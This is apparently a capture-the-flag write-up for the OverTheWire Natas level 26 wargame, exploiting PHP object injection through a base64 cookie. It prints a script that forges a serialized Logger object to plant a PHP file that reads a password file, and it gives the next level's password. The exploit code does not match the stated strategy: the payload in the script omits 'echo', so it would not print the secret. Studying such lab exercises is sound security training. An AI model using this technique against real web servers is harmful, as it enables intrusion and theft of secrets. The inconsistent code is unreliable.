# 🚩 OverTheWire: Natas Wargame Solutions - Level 26
---
This level is a classic example of **PHP Object Injection**.
We need to identify two things: an "injection point" (where user input is deserialized) and a "gadget" (a class that does something dangerous when manipulated).
**The Injection Point:** In the `drawFromUserdata` function, look at this line:
```PHP
$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```
**The Gadget:** Look at the `Logger` class provided in the code

**The Vulnerability:** When an object is deserialized, PHP does **not** call `__construct()`, but it **does** call `__destruct()` when the script finishes execution.
**The Goal:** We can create a serialized `Logger` object where we define `$logFile` (where to write) and `$exitMsg` (what to write).
The script normally writes to `/tmp/natas26_...`, but since we are bypassing `__construct`, we can set `$logFile` to any path the web server has permission to write to.

**The Strategy**
**File Path:** We need to write a file we can access via the browser to execute code. The script already saves images to the `img/` directory, so that folder must be writable. We will set `$logFile` to `img/exploit.php`.
**Payload:** We want to read the password for the next level. We will set `$exitMsg` to `<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>`.
**Generation:** We will write a small local PHP script to generate the base64 encoded serialized object.

PHP code to generate exploit payload:
```PHP
<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // We set the message to our malicious PHP code
        $this->exitMsg = "<?php file_get_contents('/etc/natas_webpass/natas27'); ?>";
        
        // We set the log file to a .php file in the accessible img/ directory
        $this->logFile = "img/natas26_pwned.php";
        
        // initMsg isn't used in destruct, but we initialize it to keep structure clean
        $this->initMsg = ""; 
    }
}

$object = new Logger();
print base64_encode(serialize($object));

?>
```

Set the output of previous code to `drawing` cookie, refresh the page and then go to `http://natas26.natas.labs.overthewire.org/img/natas26_pwned.php`

password for next level = `u3RRffXjysjgwFU6b9xa23i6prmUsYne`